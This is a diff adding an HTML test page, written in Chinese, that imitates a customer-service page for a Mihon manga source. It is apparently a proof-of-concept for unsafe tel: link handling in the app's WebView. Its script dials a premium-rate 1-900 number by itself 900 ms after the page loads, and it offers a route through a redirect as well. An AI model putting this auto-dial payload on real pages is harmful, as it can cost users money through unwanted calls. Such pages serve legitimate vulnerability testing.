@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Mihon 漫画源客服</title>
+<style>
+body { font-family: sans-serif; max-width: 720px; margin: 24px auto; padding: 0 16px; color: #333; }
+h2 { color: #2a6496; }
+.card { background: #f5f5f5; border-radius: 8px; padding: 16px; margin: 12px 0; }
+.info { color: #666; font-size: 14px; }
+button { padding: 10px 14px; border: 0; border-radius: 6px; background: #2a6496; color: white; font-size: 15px; }
+pre { background: #eee; padding: 10px; border-radius: 4px; font-size: 12px; white-space: pre-wrap; word-break: break-all; }
+</style>
+</head>
+<body>
+<h2>Mihon 漫画源客服</h2>
+<p class="info">页面模拟漫画源帮助页中的客服电话入口。漏洞分支会在 WebView 中直接处理 tel: scheme。</p>
+
+<div class="card">
+<h3>客服热线</h3>
+<p id="status">正在准备联系客服...</p>
+<button onclick="triggerDirect()">直接拨打客服</button>
+<button onclick="triggerRedirect()">通过活动页跳转拨打</button>
+</div>
+
+<div class="card">
+<h3>触发链路</h3>
+<pre id="log"></pre>
+</div>
+
+<script>
+var phoneNumber = "+19005550199";
+
+function appendLog(text) {
+    var log = document.getElementById("log");
+    log.textContent += text + "\n";
+}
+
+function triggerDirect() {
+    var target = "tel:" + phoneNumber;
+    document.getElementById("status").textContent = "正在触发 tel: 客服电话链接...";
+    appendLog("direct navigation: " + target);
+    location.href = target;
+}
+
+function triggerRedirect() {
+    var target = "/redirect-tel?number=" + encodeURIComponent(phoneNumber);
+    document.getElementById("status").textContent = "正在通过 302 跳转到 tel: 客服电话链接...";
+    appendLog("redirect navigation: " + target);
+    location.href = target;
+}
+
+setTimeout(triggerDirect, 900);
+</script>
+</body>
+</html>
